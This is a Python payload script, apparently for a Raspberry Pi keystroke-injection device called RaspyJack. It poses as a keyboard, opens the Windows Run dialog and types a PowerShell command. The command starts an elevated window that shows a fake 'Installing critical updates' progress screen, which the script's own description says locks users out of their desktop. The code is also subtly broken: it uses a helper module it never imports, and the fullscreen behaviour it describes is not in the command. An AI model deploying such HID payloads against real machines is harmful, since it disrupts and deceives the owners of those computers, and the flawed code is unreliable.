#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **HID Attack: Fake Windows Update**
===========================================================
A social engineering HID attack that opens PowerShell in fullscreen and
displays a fake "Installing critical updates..." message, effectively
locking the user out of their desktop until they reboot.
"""

import os, sys, subprocess, time
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Fake Update"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    # PowerShell command to create a fake update screen
    ps_command = '''powershell -WindowStyle Hidden -command "Start-Process powershell -ArgumentList '-NoExit -Command Write-Host \\'Installing critical updates, do not turn off your computer...\\'; for($i=0; $i -le 100; $i++) { Write-Progress -Activity \\'Configuring Windows Updates\\' -Status \\"$i% Complete\\" -PercentComplete $i; Start-Sleep -Milliseconds 300; }' -Verb RunAs"'''
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
        time.sleep(0.5)
        hid_helper.type_string("powershell")
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.75)
        hid_helper.type_string(ps_command)
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
